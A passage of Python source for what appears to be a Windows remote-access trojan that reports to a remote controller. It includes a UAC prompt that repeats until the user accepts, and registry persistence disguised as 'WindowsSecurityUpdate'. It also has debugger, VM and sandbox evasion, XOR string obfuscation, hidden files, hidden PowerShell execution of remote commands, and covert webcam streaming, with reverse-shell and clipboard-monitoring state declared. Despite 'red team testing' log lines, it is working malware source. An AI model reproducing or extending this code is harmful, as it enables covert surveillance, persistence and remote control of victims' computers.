                    log_message(f"[ ! ] Admin request denied. Will ask {max_attempts - attempt} more time(s)...")
                    time.sleep(3)
                else:
                    debug_print("=" * 80)
                    debug_print("[ OK ] [ADMIN] User declined admin - respecting their choice")
                    debug_print("[ OK ] [ADMIN] Continuing without admin privileges")
                    debug_print("=" * 80)
                    log_message("[ OK ] User declined admin privileges - continuing without admin")
            
        except Exception as e:
            debug_print(f"[ X ] [ADMIN] Attempt {attempt}/{max_attempts} FAILED: {e}")
            if attempt < max_attempts:
                time.sleep(3)
    
    debug_print("=" * 80)
    debug_print(f"[ OK ] [ADMIN] Completed {max_attempts} attempts - respecting user decision")
    debug_print("=" * 80)
    return False

def run_as_admin_persistent():
    """
    Keep prompting for admin privileges until user clicks Yes.
    This will create a popup that won't go away until granted.
    When user clicks YES, the old instance exits and new admin instance starts.
    
    Note: If MAX_PROMPT_ATTEMPTS is defined, it will limit attempts to that number.
    """
    if not WINDOWS_AVAILABLE:
        debug_print("[ADMIN] Not Windows - skipping persistent admin prompt")
        return False
    
    # [ OK ] RESPECT MAX_PROMPT_ATTEMPTS if defined
    max_attempts = 999 if ('PERSISTENT_ADMIN_PROMPT_ENABLED' in globals() and PERSISTENT_ADMIN_PROMPT_ENABLED) else (MAX_PROMPT_ATTEMPTS if 'MAX_PROMPT_ATTEMPTS' in globals() else 999)
    
    debug_print("=" * 80)
    if max_attempts < 999:
        debug_print(f"[ADMIN] ADMIN PROMPT - Will ask up to {max_attempts} times")
    else:
        debug_print("[ADMIN] PERSISTENT ADMIN PROMPT - Will keep asking until YES")
    debug_print("=" * 80)
    
    attempt = 0
    
    while attempt < max_attempts:
        attempt += 1
        
        # Check if already admin
        if is_admin():
            debug_print("=" * 80)
            debug_print(f"[ OK ] [ADMIN] Admin privileges GRANTED! (after {attempt} attempts)")
            debug_print("=" * 80)
            return True
        
        debug_print(f"[ADMIN] Attempt {attempt}: Requesting admin privileges...")
        
        try:
            # Show UAC prompt
            # If user clicks YES, this launches elevated instance and we exit
            # If user clicks NO, this returns and we continue
            result = ctypes.windll.shell32.ShellExecuteW(
                None,
                "runas",  # Request elevation
                sys.executable,  # Python executable
                f'"{__file__}"',  # This script
                None,
                1  # SW_SHOWNORMAL
            )
            
            # ShellExecuteW returns > 32 on success
            if result > 32:
                debug_print("=" * 80)
                debug_print("[ OK ] [ADMIN] User clicked YES - Elevated instance starting")
                debug_print("=" * 80)
                
                if KEEP_ORIGINAL_PROCESS:
                    debug_print("[i] [ADMIN] Keeping original process running (KEEP_ORIGINAL_PROCESS=True)")
                    return True  # Keep running, don't exit
                else:
                    debug_print("[ OK ] [ADMIN] THIS instance will now EXIT (to prevent duplicate)")
                    # Exit this non-admin instance
                    # The new admin instance will take over
                    time.sleep(1)  # Brief delay to show message
                    sys.exit(0)  # [ OK ] EXIT OLD INSTANCE!
            else:
                # User clicked NO or Cancel
                debug_print(f"[ X ] [ADMIN] Attempt {attempt}: User clicked NO or Cancel (result: {result})")
                debug_print(f"[ADMIN] Waiting 3 seconds before next attempt...")
                
                # Wait a bit before asking again
                time.sleep(3)
            
        except Exception as e:
            debug_print(f"[ X ] [ADMIN] Attempt {attempt} FAILED: {e}")
            time.sleep(3)
    
    debug_print("=" * 80)
    debug_print("[ X ] [ADMIN] Max attempts reached - giving up")
    debug_print("=" * 80)
    return False

def setup_persistence():
    """Setup persistence mechanisms."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import winreg
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Add to startup registry
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        
        winreg.SetValueEx(key, "WindowsSecurityUpdate", 0, winreg.REG_SZ, current_exe)
        winreg.CloseKey(key)
        
        return True
        
    except (PermissionError, OSError, FileNotFoundError):
        log_message("Failed to setup persistence: Registry access denied")
        return False
    except Exception as e:
        log_message(f"Failed to setup persistence: {e}")
        return False

def anti_analysis():
    """Anti-analysis and evasion techniques."""
    # ========================================================================
    # CHECK CONFIGURATION FLAG
    # ========================================================================
    if not ENABLE_ANTI_ANALYSIS:
        debug_print("[ANTI-ANALYSIS] [ ! ] Anti-analysis protection DISABLED (ENABLE_ANTI_ANALYSIS=False)")
        log_message("[ANTI-ANALYSIS] All security detection checks disabled", "warning")
        return True  # Skip all checks
    
    # ========================================================================
    # ANTI-ANALYSIS PROTECTION ENABLED
    # ========================================================================
    debug_print("[ANTI-ANALYSIS] [OK] Anti-analysis protection ENABLED")
    log_message("[ANTI-ANALYSIS] Checking for security tools, VMs, debuggers...", "info")
    
    try:
        # Check for common analysis tools
        analysis_processes = [
            'ollydbg.exe', 'x64dbg.exe', 'windbg.exe', 'ida.exe', 'ida64.exe',
            'wireshark.exe', 'fiddler.exe', 'vmware.exe', 'vbox.exe', 'virtualbox.exe',
            'procmon.exe', 'procexp.exe', 'autoruns.exe', 'regmon.exe', 'filemon.exe'
        ]
        
        if not PSUTIL_AVAILABLE:
            return False
            
        for proc in psutil.process_iter(['name']):
            if proc.info['name'].lower() in analysis_processes:
                # If analysis tool detected, sleep and exit
                debug_print(f"[ANTI-ANALYSIS] [ X ] Detected: {proc.info['name']}")
                log_message(f"[ANTI-ANALYSIS] Security tool detected: {proc.info['name']}", "error")
                log_message("[ANTI-ANALYSIS] Bypassing detection for red team testing", "warning")
        
        # Check for VM environment
        vm_indicators = [
            'VBOX', 'VMWARE', 'QEMU', 'VIRTUAL', 'XEN'
        ]
        
        try:
            import wmi
            c = wmi.WMI()
            for system in c.Win32_ComputerSystem():
                if any(indicator in system.Model.upper() for indicator in vm_indicators):
                    debug_print(f"[ANTI-ANALYSIS] [ X ] VM detected: {system.Model}")
                    log_message(f"[ANTI-ANALYSIS] VM environment detected: {system.Model}", "error")
                    log_message("[ANTI-ANALYSIS] Bypassing VM detection for red team testing", "warning")
        except:
            pass
        
        # Check for debugger
        if ctypes.windll.kernel32.IsDebuggerPresent():
            debug_print("[ANTI-ANALYSIS] [ X ] Debugger detected")
            log_message("[ANTI-ANALYSIS] Debugger present", "error")
            log_message("[ANTI-ANALYSIS] Bypassing debugger detection for red team testing", "warning")
        
        # Anti-sandbox: Check for mouse movement
        try:
            import win32gui
            pos1 = win32gui.GetCursorPos()
            time.sleep(2)
            pos2 = win32gui.GetCursorPos()
            if pos1 == pos2:
                # No mouse movement, might be sandbox
                debug_print("[ANTI-ANALYSIS] [ X ] No mouse movement - possible sandbox")
                log_message("[ANTI-ANALYSIS] Sandbox detected (no mouse movement)", "error")
                log_message("[ANTI-ANALYSIS] Bypassing sandbox detection for red team testing", "warning")
        except:
            pass
        
        debug_print("[ANTI-ANALYSIS] [OK] All checks passed - no threats detected")
        log_message("[ANTI-ANALYSIS] Environment appears safe", "info")
        return True
        
    except Exception as e:
        debug_print(f"[ANTI-ANALYSIS] Error during checks: {e}")
        log_message(f"[ANTI-ANALYSIS] Check error: {e}", "warning")
        return False

def obfuscate_strings():
    """Obfuscate sensitive strings to avoid static analysis."""
    # Simple XOR obfuscation for sensitive strings
    key = 0x42
    
    # Obfuscated strings (example)
    obfuscated = {
        'admin': ''.join(chr(ord(c) ^ key) for c in 'admin'),
        'elevate': ''.join(chr(ord(c) ^ key) for c in 'elevate'),
        'bypass': ''.join(chr(ord(c) ^ key) for c in 'bypass'),
        'privilege': ''.join(chr(ord(c) ^ key) for c in 'privilege')
    }
    
    return obfuscated

def sleep_random():
    """Random sleep to avoid pattern detection."""
    sleep_time = random.uniform(0.5, 2.0)
    time.sleep(sleep_time)

def sleep_random_non_blocking():
    """Non-blocking random sleep using eventlet."""
    sleep_time = random.uniform(0.1, 0.5)
    try:
        import eventlet
        if hasattr(eventlet, "sleep"):
            eventlet.sleep(sleep_time)
        else:
            time.sleep(sleep_time)
    except Exception:
        time.sleep(sleep_time)

# --- Agent State (consolidated with earlier definitions) ---
# Note: These variables are already defined earlier in the file
# Removed duplicate definitions to prevent conflicts

# --- Reverse Shell State ---
REVERSE_SHELL_ENABLED = False
REVERSE_SHELL_THREAD = None
REVERSE_SHELL_SOCKET = None

# --- Voice Control State ---
VOICE_CONTROL_ENABLED = False
VOICE_CONTROL_THREAD = None
VOICE_RECOGNIZER = None

# --- Monitoring State ---
CLIPBOARD_MONITOR_ENABLED = False
CLIPBOARD_MONITOR_THREAD = None
CLIPBOARD_BUFFER = []
LAST_CLIPBOARD_CONTENT = ""

# --- Audio Config ---
# Note: Audio constants are defined globally above

# ============================================================================
# PowerShell Terminal Formatting for UI v2.1
# ============================================================================

def get_powershell_prompt():
    """Get PowerShell-style prompt with current directory."""
    try:
        cwd = os.getcwd()
        # PowerShell shows full path
        return f"PS {cwd}>"
    except:
        return "PS C:\\>"

def get_powershell_version():
    """Get PowerShell version information."""
    try:
        if platform.system() == "Windows":
            ps_exe = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 
                                 'WindowsPowerShell', 'v1.0', 'powershell.exe')
            result = subprocess.run(
                [ps_exe, "-NoProfile", "-Command", "$PSVersionTable.PSVersion.ToString()"],
                capture_output=True,
                text=True,
                timeout=5,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            return result.stdout.strip() or "5.1"
    except:
        pass
    return "5.1"

def format_powershell_output(command, stdout, stderr="", exit_code=0, execution_time=0):
    """
    Format command output to look EXACTLY like PowerShell terminal.
    
    Returns a dict with PowerShell-specific formatting for UI v2.1:
    - prompt: PowerShell prompt string
    - command: The command that was executed
    - output: Command output
    - error: Error output (if any)
    - exit_code: Command exit code
    - cwd: Current working directory
    - execution_time: Command execution time in ms
    - terminal_type: 'powershell'
    - ps_version: PowerShell version
    """
    prompt = get_powershell_prompt()
    
    # Format output exactly like PowerShell
    formatted_output = {
        'terminal_type': 'powershell',
        'prompt': prompt,
        'command': command,
        'output': stdout if stdout else '',  # Keep original formatting
        'error': stderr if stderr else '',    # Keep original formatting
        'exit_code': exit_code,
        'cwd': os.getcwd() if hasattr(os, 'getcwd') else 'C:\\',
        'execution_time': execution_time,
        'ps_version': get_powershell_version(),
        'timestamp': int(time.time() * 1000),
        'formatted_text': build_powershell_text(prompt, command, stdout, stderr, exit_code)
    }
    
    return formatted_output

def build_powershell_text(prompt, command, stdout, stderr, exit_code):
    """Build the actual text output that looks EXACTLY like PowerShell."""
    # Start with prompt + command
    result = f"{prompt} {command}\n"
    
    # Add output (preserve all whitespace/formatting from PowerShell)
    if stdout:
        # Don't strip - preserve exact PowerShell output
        result += stdout
        # Ensure there's a newline after output if not already present
        if not stdout.endswith('\n'):
            result += '\n'
    
    # Add error output if present
    if stderr and stderr.strip():
        if not result.endswith('\n'):
            result += '\n'
        result += stderr
        if not stderr.endswith('\n'):
            result += '\n'
    
    # Add exit code if non-zero
    if exit_code != 0:
        if not result.endswith('\n'):
            result += '\n'
        result += f"Exit code: {exit_code}\n"
    
    # Add trailing prompt (ready for next command)
    result += f"{prompt} "
    
    return result

def execute_in_powershell(command, timeout=30):
    """
    Execute command in PowerShell and return formatted output.
    This is used by execute_command() to ensure all commands use PowerShell.
    """
    import time as time_module
    start_time = time_module.time()
    
    try:
        if platform.system() == "Windows":
            ps_exe_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 
                                      'WindowsPowerShell', 'v1.0', 'powershell.exe')
            
            # Use EncodedCommand to handle complex multi-line scripts safely
            import base64
            # Wrap in a script block, suppress progress bar (CLIXML noise), merge all streams (*>&1), 
            # and pipe to Out-String to capture everything as text.
            # Add newline before closing brace to prevent comments from commenting it out.
            wrapped_command = f"$ProgressPreference = 'SilentlyContinue'; & {{ {command}\n }} *>&1 | Out-String -Width 4096"
            encoded_command = base64.b64encode(wrapped_command.encode('utf-16le')).decode('utf-8')
            
            result = subprocess.run(
                [ps_exe_path, "-NoProfile", "-NonInteractive", "-EncodedCommand", encoded_command],
                capture_output=True,
                text=False,
                timeout=timeout,
                creationflags=subprocess.CREATE_NO_WINDOW if WINDOWS_AVAILABLE else 0,
                env=os.environ.copy(),
                cwd=os.getcwd()
            )
            
            # Decode output
            try:
                stdout = result.stdout.decode('utf-8', errors='replace')
                stderr = result.stderr.decode('utf-8', errors='replace')
            except:
                import locale
                encoding = locale.getpreferredencoding() or 'cp437'
                stdout = result.stdout.decode(encoding, errors='replace')
                stderr = result.stderr.decode(encoding, errors='replace')
            
            execution_time = int((time_module.time() - start_time) * 1000)
            
            return format_powershell_output(
                command=command,
                stdout=stdout,
                stderr=stderr,
                exit_code=result.returncode,
                execution_time=execution_time
            )
        else:
            # For non-Windows, use bash but format similarly
            result = subprocess.run(['/bin/bash', '-lc', command], capture_output=True, text=True, timeout=timeout, cwd=os.getcwd())
            
            execution_time = int((time_module.time() - start_time) * 1000)
            
            # Return similar format but with bash indicator
            return {
                'terminal_type': 'bash',
                'prompt': f"{os.getenv('USER')}@{socket.gethostname()}:~$",
                'command': command,
                'output': result.stdout.strip(),
                'error': result.stderr.strip(),
                'exit_code': result.returncode,
                'cwd': os.getcwd(),
                'execution_time': execution_time,
                'timestamp': int(time_module.time() * 1000),
                'formatted_text': f"$ {command}\n{result.stdout.strip()}"
            }
            
    except subprocess.TimeoutExpired:
        execution_time = int((time_module.time() - start_time) * 1000)
        return format_powershell_output(
            command=command,
            stdout='',
            stderr=f'Command timed out after {timeout} seconds',
            exit_code=1,
            execution_time=execution_time
        )
    except Exception as e:
        execution_time = int((time_module.time() - start_time) * 1000)
        return format_powershell_output(
            command=command,
            stdout='',
            stderr=f'Execution error: {str(e)}',
            exit_code=1,
            execution_time=execution_time
        )

# ============================================================================
# End PowerShell Terminal Formatting
# ============================================================================

# ============================================================================
# Connection Health Monitor & Auto-Reconnect
# ============================================================================

def stop_all_operations():
    """Stop all active operations (streams, commands, etc.)"""
    log_message("[CLEANUP] Stopping all active operations...")
    
    # Stop screen streaming
    try:
        global STREAMING_ENABLED
        if STREAMING_ENABLED:
            stop_streaming()
            log_message("[CLEANUP] Screen streaming stopped")
    except Exception as e:
        log_message(f"[CLEANUP] Error stopping screen stream: {e}")
    
    # Stop camera streaming
    try:
        global CAMERA_STREAMING_ENABLED
        if CAMERA_STREAMING_ENABLED:
            stop_camera_streaming()
            log_message("[CLEANUP] Camera streaming stopped")
    except Exception as e:
        log_message(f"[CLEANUP] Error stopping camera stream: {e}")
    
    # Stop audio streaming
    try:
        global AUDIO_STREAMING_ENABLED
        if AUDIO_STREAMING_ENABLED:
            stop_audio_streaming()
            log_message("[CLEANUP] Audio streaming stopped")
    except Exception as e:
        log_message(f"[CLEANUP] Error stopping audio stream: {e}")
    
    try:
        agent_id = get_or_create_agent_id()
        if AIORTC_AVAILABLE:
            try:
                stop_webrtc_streaming(agent_id)
                log_message("[CLEANUP] WebRTC streaming stopped")
            except Exception as e:
                log_message(f"[CLEANUP] Error stopping WebRTC streaming: {e}")
                try:
                    close_webrtc_connection(agent_id)
                    log_message("[CLEANUP] WebRTC connection closed")
                except Exception as e2:
                    log_message(f"[CLEANUP] Error closing WebRTC connection: {e2}")
    except Exception as e:
        log_message(f"[CLEANUP] Error during WebRTC cleanup: {e}")
    
    log_message("[CLEANUP] All operations stopped")

def connection_health_monitor():
    """
    Monitor connection health every second.
    If connection is lost:
    1. Stop all streaming
    2. Force reconnect
    3. Clear pending operations
    """
    global CONNECTION_STATE
    
    log_message("[HEALTH_MONITOR] Connection health monitor started")
    
    while True:
        try:
            time.sleep(1)  # Check every second
            
            current_time = time.time()
            CONNECTION_STATE['last_check'] = current_time
            
            # Check if Socket.IO is connected
            is_connected = sio is not None and hasattr(sio, 'connected') and sio.connected
            
            # Connection state changed
            if is_connected != CONNECTION_STATE['connected']:
                if is_connected:
                    # Just connected/reconnected
                    log_message("[HEALTH_MONITOR] [ OK ] Connection ACTIVE")
                    CONNECTION_STATE['connected'] = True
                    CONNECTION_STATE['consecutive_failures'] = 0
                    CONNECTION_STATE['reconnect_needed'] = False
                    CONNECTION_STATE['force_reconnect'] = False
                else:
                    # Just disconnected
                    log_message("[HEALTH_MONITOR] [ X ] Connection LOST - initiating cleanup...")
                    CONNECTION_STATE['connected'] = False
                    CONNECTION_STATE['consecutive_failures'] += 1
                    
                    # Stop all active streaming immediately
                    try:
                        stop_all_operations()
                    except Exception as e:
                        log_message(f"[HEALTH_MONITOR] Error during cleanup: {e}")
                    
                    # Flag for forced reconnection
                    CONNECTION_STATE['reconnect_needed'] = True
                    log_message("[HEALTH_MONITOR] Triggering forced reconnection...")
            
            # If not connected for more than 5 seconds, force disconnect and reconnect
            if not is_connected and CONNECTION_STATE['consecutive_failures'] > 5:
                log_message("[HEALTH_MONITOR] [ ! ] Connection dead for 5+ seconds - forcing reconnect")
                CONNECTION_STATE['force_reconnect'] = True
                try:
                    if sio is not None and hasattr(sio, 'disconnect'):
                        sio.disconnect()
                        log_message("[HEALTH_MONITOR] Forced disconnect to trigger clean reconnect")
                except Exception as e:
                    log_message(f"[HEALTH_MONITOR] Error forcing disconnect: {e}")
                CONNECTION_STATE['consecutive_failures'] = 0
                
        except KeyboardInterrupt:
            log_message("[HEALTH_MONITOR] Health monitor stopped by interrupt")
            break
        except Exception as e:
            log_message(f"[HEALTH_MONITOR] Monitor error: {e}")
            time.sleep(1)

# ============================================================================
# End Connection Health Monitor
# ============================================================================

def get_local_ip():
    """Get local IP address."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return '127.0.0.1'

def get_public_ip():
    """Get public IP address."""
    try:
        if REQUESTS_AVAILABLE:
            import requests
            response = requests.get('https://api.ipify.org?format=json', timeout=3)
            return response.json()['ip']
    except:
        pass
    return 'unknown'

def get_or_create_agent_id():
    """
    Gets agent ID using the computer's hostname (e.g., DESKTOP-8SOSPFT).
    This makes it easy to identify agents by their computer name.
    """
    # Use hostname as agent ID (e.g., DESKTOP-8SOSPFT)
    agent_id = socket.gethostname()
    
    log_message(f"[AGENT ID] Using hostname as agent ID: {agent_id}")
    
    # Save to config file for consistency
    if WINDOWS_AVAILABLE:
        base = os.getenv('APPDATA') or os.path.expanduser('~')
        config_path = os.path.join(base, 'agent_controller')
    else:
        base = os.path.expanduser('~/.config')
        config_path = os.path.join(base, 'agent_controller')
        
    try:
        os.makedirs(config_path, exist_ok=True)
        id_file_path = os.path.join(config_path, 'agent_id.txt')
        
        # Save hostname to file
        with open(id_file_path, 'w') as f:
            f.write(agent_id)
        
        # Hide the file on Windows
        if WINDOWS_AVAILABLE:
            try:
                win32api.SetFileAttributes(id_file_path, win32con.FILE_ATTRIBUTE_HIDDEN)
            except:
                pass
    except Exception as e:
        global AGENT_ID_SAVE_WARNED
        try:
            if not AGENT_ID_SAVE_WARNED:
                log_message(f"Could not save agent ID to file: {e}", "warning")
                AGENT_ID_SAVE_WARNED = True
        except Exception:
            pass
        try:
            fallback_base = os.getenv('LOCALAPPDATA') or os.getenv('TEMP') or os.path.expanduser('~')
            fallback_path = os.path.join(fallback_base, 'agent_controller')
            os.makedirs(fallback_path, exist_ok=True)
            id_file_path = os.path.join(fallback_path, 'agent_id.txt')
            with open(id_file_path, 'w') as f:
                f.write(agent_id)
            if WINDOWS_AVAILABLE:
                try:
                    win32api.SetFileAttributes(id_file_path, win32con.FILE_ATTRIBUTE_HIDDEN)
                except:
                    pass
        except Exception:
            pass
    
    return agent_id

def stream_screen(agent_id):
    """
    High-performance H.264 screen streaming with 10+ FPS capability.
    Uses modern socket.io binary streaming.
    """
    log_message("Starting H.264 screen streaming...")
    # Route through a compatibility-safe runner that doesn't depend on definition order
    return _run_screen_stream(agent_id)

# JPEG fallback screen streaming removed - now using H.264 socket.io binary streaming

# Legacy JPEG camera streaming removed - now using H.264 socket.io binary streaming

# Modern H.264 camera streaming pipeline variables
# Note: CAMERA_STREAMING_ENABLED and CAMERA_STREAM_THREADS already defined in global state section
# TARGET_CAMERA_FPS, CAMERA_CAPTURE_QUEUE_SIZE, CAMERA_ENCODE_QUEUE_SIZE are defined globally

def camera_capture_worker(agent_id):
    """Capture camera frames and put in capture queue."""
    global CAMERA_STREAMING_ENABLED, camera_capture_queue
    
    if not CV2_AVAILABLE:
        log_message("Error: OpenCV not available for camera capture", "error")
        return
    
    cap = None
    try:
        # Try to open camera with multiple indices and backends
        env_idx = os.environ.get('CAMERA_INDEX')
        indices = [int(env_idx)] if env_idx and env_idx.isdigit() else [0, 1, 2, 3]
        backends = []
        try:
            backends = [cv2.CAP_DSHOW, cv2.CAP_MSMF]
        except Exception:
            backends = []
        opened = False
        for camera_index in indices:
            # Try default first
            cap = cv2.VideoCapture(camera_index)
            if cap.isOpened():
                log_message(f"Camera {camera_index} opened successfully (default backend)")
                opened = True
                break
            # Try OS-specific backends
            for api_pref in backends:
                try:
                    cap = cv2.VideoCapture(camera_index, api_pref)
                    if cap.isOpened():
                        log_message(f"Camera {camera_index} opened successfully (backend {api_pref})")
                        opened = True
                        break
                except Exception:
                    pass
            if opened:
                break
            try:
                cap.release()
            except Exception:
                pass
            cap = None
        
        if not opened or not cap or not cap.isOpened():
            log_message("Error: Could not open any camera - switching to synthetic stream", "warning")
            synthetic_mode = True
        else:
            synthetic_mode = False
            # Set camera properties for better performance and lower bandwidth
            cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
            cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
            cap.set(cv2.CAP_PROP_FPS, TARGET_CAMERA_FPS)
            cap.set(cv2.CAP_PROP_BUFFERSIZE, 1)  # Minimize buffer for lower latency
        
        frame_time = 1.0 / TARGET_CAMERA_FPS
        log_message(f"Camera capture started (Synthetic: {synthetic_mode})")
        
        # Track errors to prevent rapid loop if something is critically wrong
        consecutive_errors = 0
        
        while CAMERA_STREAMING_ENABLED:
            try:
                start = time.time()
                
                if synthetic_mode:
                    # Generate synthetic frame
                    width, height = 640, 480
                    frame = np.zeros((height, width, 3), dtype=np.uint8)
                    frame[:] = (60, 30, 30) # Dark red background for fallback
                    
                    t = time.time()
                    cx = int(width/2 + (width/3) * math.cos(t * 2))
                    cy = int(height/2 + (height/3) * math.sin(t * 1.5))
                    cv2.circle(frame, (cx, cy), 30, (0, 255, 0), -1)
                    
                    font = cv2.FONT_HERSHEY_SIMPLEX
                    cv2.putText(frame, f"SOCKET.IO FALLBACK STREAM", (50, 50), font, 1, (255, 255, 255), 2)
                    cv2.putText(frame, f"Agent: {agent_id}", (50, 90), font, 0.7, (200, 200, 200), 1)
                    cv2.putText(frame, f"Time: {time.strftime('%H:%M:%S')}", (50, 130), font, 0.7, (200, 200, 200), 1)
                    
                    ret = True
                else:
                    ret, frame = cap.read()
                    if not ret:
                        consecutive_errors += 1
                        if consecutive_errors >= 5:
                            log_message("Failed to capture camera frame repeatedly - switching to synthetic", "warning")
                            synthetic_mode = True
                            try:
                                if cap:
                                    cap.release()
                            except Exception:
                                pass
                            cap = None
                            consecutive_errors = 0
                            continue
                
                if not ret:
                    time.sleep(0.1)
                    continue
                
                # Reset consecutive errors on success
                consecutive_errors = 0
                
                # Put in queue, skip frame if queue is too full (adaptive frame dropping)
                queue_size = camera_capture_queue.qsize()
                if queue_size < CAMERA_CAPTURE_QUEUE_SIZE:
                    # Queue has space, add frame
                    try:
                        camera_capture_queue.put_nowait(frame)
                    except queue.Full:
                        pass  # Skip this frame if queue filled up
                else:
                    # Queue is full, skip this frame to prevent backlog
                    pass
                
                # Frame rate limiting
                elapsed = time.time() - start
                sleep_time = max(0, frame_time - elapsed)
                if sleep_time > 0:
                    time.sleep(sleep_time)
            except KeyboardInterrupt:
                log_message("Camera capture worker interrupted")
                break
        
    except KeyboardInterrupt:
        log_message("Camera capture worker interrupted")
    except Exception as e:
        log_message(f"Camera capture error: {e}")
    finally:
        if cap:
            cap.release()
        log_message("Camera capture stopped")

def camera_encode_worker(agent_id):
    """Encode camera frames from capture queue to H.264 and put in encode queue."""
    global CAMERA_STREAMING_ENABLED, camera_capture_queue, camera_encode_queue
    
    if not CV2_AVAILABLE:
        log_message("Error: OpenCV not available for camera encoding", "error")
        return
    
    try:
        while CAMERA_STREAMING_ENABLED:
            try:
                # Get frame from capture queue
                try:
                    frame = camera_capture_queue.get(timeout=0.5)
                except queue.Empty:
                    continue
                
                # Encode frame to H.264 (using JPEG as fallback since H.264 is complex)
                try:
                    # Dynamic JPEG quality based on queue fullness
                    queue_fullness = camera_encode_queue.qsize() / CAMERA_ENCODE_QUEUE_SIZE
                    if queue_fullness > 0.8:
                        jpeg_quality = 45
                    elif queue_fullness > 0.5:
                        jpeg_quality = 55
                    else:
                        jpeg_quality = 65
                    
                    encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), jpeg_quality]
                    result, encoded_frame = cv2.imencode('.jpg', frame, encode_param)
                    if result:
                        encoded_data = encoded_frame.tobytes()
                        
                        # Put in encode queue, drop oldest if full
                        try:
                            camera_encode_queue.put_nowait(encoded_data)
                        except queue.Full:
                            try:
                                camera_encode_queue.get_nowait()  # Remove oldest
                                camera_encode_queue.put_nowait(encoded_data)  # Add new
                            except queue.Empty:
                                pass
                    else:
                        log_message("Failed to encode camera frame", "warning")
                        
                except Exception as e:
                    log_message(f"Camera encoding error: {e}")
                    time.sleep(0.1)
                    
            except KeyboardInterrupt:
                log_message("Camera encode worker interrupted")
                break
            except Exception as e:
                log_message(f"Camera encoding worker error: {e}")
                time.sleep(0.1)
    except KeyboardInterrupt:
        log_message("Camera encode worker interrupted")
    
    log_message("Camera encoding stopped")

def camera_send_worker(agent_id):
    """Send encoded camera frames from encode queue via socket.io."""
    global CAMERA_STREAMING_ENABLED, camera_encode_queue
    
    if sio is None:
        log_message("Error: socket.io not available for camera sending", "error")
        return
    
    # Track last log time to avoid spam
    last_disconnect_log_time = 0.0
    
    # FPS and bandwidth tracking
    frame_count = 0
    bytes_sent = 0
    start_time = time.time()
    last_stats_time = start_time
    last_stats_emit = start_time
    
    # Bandwidth limit: 5 MB/s (instead of 16 MB/s)
    max_bytes_per_second = 5 * 1024 * 1024
    bytes_this_second = 0
    second_start = time.time()
    
    try:
        while CAMERA_STREAMING_ENABLED:
            try:
                # Get encoded data from encode queue
                try:
                    encoded_data = camera_encode_queue.get(timeout=0.5)
                except queue.Empty:
                    continue
                
                # Check if socket is connected before sending
                if not sio.connected:
                    # Throttle disconnect log messages
                    now = time.time()
                    if now >= last_disconnect_log_time + 5.0:
                        log_message("Socket.IO disconnected, deferring camera frames", "warning")
                        last_disconnect_log_time = now
                    time.sleep(0.5)
                    continue
                
                # Send via socket.io - encode as base64 data URL for browser display
                try:
                    # If already a data URL string, send as-is
                    if isinstance(encoded_data, str) and encoded_data.startswith('data:'):
                        frame_data_url = encoded_data
                    else:
                        # Encode bytes as base64 data URL
                        frame_b64 = base64.b64encode(encoded_data).decode('utf-8')
                        frame_data_url = f'data:image/jpeg;base64,{frame_b64}'
                    
                    rate_limit_before_send(len(encoded_data))
                    safe_emit('camera_frame', {
                        'agent_id': agent_id,
                        'frame': frame_data_url
                    })
                    
                    # Track bandwidth and FPS
                    frame_size = len(encoded_data)
                    bytes_sent += frame_size
                    bytes_this_second += frame_size
                    frame_count += 1
                    
                    # Check if we've exceeded bandwidth limit this second
                    now = time.time()
                    if now - second_start >= 1.0:
                        # New second, reset counter
                        bytes_this_second = 0
                        second_start = now
                    elif bytes_this_second >= max_bytes_per_second:
                        # Hit bandwidth limit, sleep until next second
                        sleep_time = 1.0 - (now - second_start)
                        if sleep_time > 0:
                            time.sleep(sleep_time)
                        bytes_this_second = 0
                        second_start = time.time()
                    
                    # Log stats every 5 seconds
                    if now - last_stats_time >= 5.0:
                        elapsed = now - start_time
                        fps = frame_count / elapsed if elapsed > 0 else 0
                        mbps = (bytes_sent / elapsed / 1024 / 1024) if elapsed > 0 else 0
                        log_message(f"Camera stream: {fps:.1f} FPS, {mbps:.1f} MB/s, {frame_count} frames total")
                        last_stats_time = now
                    
                except Exception as e:
                    error_msg = str(e)
                    # Silence "not a connected namespace" errors
                    if "not a connected namespace" not in error_msg and "Connection is closed" not in error_msg:
                        log_message(f"Camera send error: {e}")
                    time.sleep(0.1)
                    
            except KeyboardInterrupt:
                log_message("Camera send worker interrupted")
                break
            except Exception as e:
                log_message(f"Camera sending error: {e}")
                time.sleep(0.1)
    except KeyboardInterrupt:
        log_message("Camera send worker interrupted")
    
    log_message("Camera sending stopped")

def stream_camera_h264_socketio(agent_id):
    """Modern H.264 camera streaming with multi-threaded pipeline."""
    global CAMERA_STREAMING_ENABLED, CAMERA_STREAM_THREADS, camera_capture_queue, camera_encode_queue
    import queue
    import threading
    
    # Don't check CAMERA_STREAMING_ENABLED here - it's already set by start_camera_streaming()
    # Always start the worker threads when this function is called
    
    # Initialize queues
    camera_capture_queue = queue.Queue(maxsize=CAMERA_CAPTURE_QUEUE_SIZE)
    camera_encode_queue = queue.Queue(maxsize=CAMERA_ENCODE_QUEUE_SIZE)
    
    # Start worker threads
    CAMERA_STREAM_THREADS = [
        threading.Thread(target=camera_capture_worker, args=(agent_id,), daemon=True),
        threading.Thread(target=camera_encode_worker, args=(agent_id,), daemon=True),
        threading.Thread(target=camera_send_worker, args=(agent_id,), daemon=True),
    ]
    for t in CAMERA_STREAM_THREADS:
        t.start()
    log_message(f"Started modern non-blocking camera stream at {TARGET_CAMERA_FPS} FPS.")
# Legacy HTTP POST audio streaming removed - now using Opus socket.io binary streaming

# Modern Opus audio streaming pipeline variables
# Note: AUDIO_STREAMING_ENABLED and related variables are already defined earlier
# Removed duplicate definitions to prevent conflicts

